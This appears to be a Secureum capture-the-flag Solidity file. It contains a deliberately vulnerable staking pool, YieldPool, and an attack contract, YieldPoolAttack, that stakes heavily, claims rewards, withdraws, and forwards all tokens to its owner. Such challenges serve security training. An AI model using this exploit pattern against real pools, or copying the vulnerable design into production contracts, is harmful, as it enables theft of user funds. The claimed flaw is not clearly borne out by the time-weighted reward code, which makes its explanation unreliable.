// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title YieldPool (Secureum CTF)
 * @notice A yield-bearing pool that distributes rewards to stakers.
 *         Vulnerability: Reward calculation can be manipulated via flash loans
 *         or by staking just before reward distribution.
 */
contract YieldPool is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public stakingToken;
    IERC20 public rewardToken;

    uint256 public rewardRate;
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;
    uint256 public periodFinish;

    mapping(address => uint256) public userRewardPerTokenPaid;
    mapping(address => uint256) public rewards;

    address public owner;

    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardPaid(address indexed user, uint256 reward);
    event RewardAdded(uint256 reward);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier updateReward(address account) {
        rewardPerTokenStored = rewardPerToken();
        lastUpdateTime = lastTimeRewardApplicable();
        if (account != address(0)) {
            rewards[account] = earned(account);
            userRewardPerTokenPaid[account] = rewardPerTokenStored;
        }
        _;
    }

    constructor(address _stakingToken, address _rewardToken) ERC20("Yield Pool Share", "YPS") {
        stakingToken = IERC20(_stakingToken);
        rewardToken = IERC20(_rewardToken);
        owner = msg.sender;
    }

    function lastTimeRewardApplicable() public view returns (uint256) {
        return block.timestamp < periodFinish ? block.timestamp : periodFinish;
    }

    function rewardPerToken() public view returns (uint256) {
        if (totalSupply() == 0) {
            return rewardPerTokenStored;
        }
        return
            rewardPerTokenStored +
            ((lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18) / totalSupply();
    }

    function earned(address account) public view returns (uint256) {
        return
            (balanceOf(account) * (rewardPerToken() - userRewardPerTokenPaid[account])) / 1e18 +
            rewards[account];
    }

    function stake(uint256 amount) external updateReward(msg.sender) {
        require(amount > 0, "Cannot stake 0");
        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
        emit Staked(msg.sender, amount);
    }

    function withdraw(uint256 amount) external updateReward(msg.sender) {
        require(amount > 0, "Cannot withdraw 0");
        _burn(msg.sender, amount);
        stakingToken.safeTransfer(msg.sender, amount);
        emit Withdrawn(msg.sender, amount);
    }

    function getReward() external updateReward(msg.sender) {
        uint256 reward = rewards[msg.sender];
        if (reward > 0) {
            rewards[msg.sender] = 0;
            rewardToken.safeTransfer(msg.sender, reward);
            emit RewardPaid(msg.sender, reward);
        }
    }

    function notifyRewardAmount(uint256 reward, uint256 duration) external onlyOwner updateReward(address(0)) {
        rewardRate = reward / duration;
        lastUpdateTime = block.timestamp;
        periodFinish = block.timestamp + duration;
        emit RewardAdded(reward);
    }
}

/**
 * @title YieldPoolAttack
 * @notice Exploit: Stake a large amount just before rewards are distributed,
 *         claim a disproportionate share of rewards, then withdraw.
 */
contract YieldPoolAttack {
    YieldPool public pool;
    IERC20 public stakingToken;
    IERC20 public rewardToken;
    address public owner;

    constructor(address _pool) {
        pool = YieldPool(_pool);
        stakingToken = pool.stakingToken();
        rewardToken = pool.rewardToken();
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        // Stake large amount
        stakingToken.approve(address(pool), amount);
        pool.stake(amount);
    }

    function claim() external {
        pool.getReward();
        pool.withdraw(pool.balanceOf(address(this)));

        // Transfer everything to owner
        stakingToken.transfer(owner, stakingToken.balanceOf(address(this)));
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
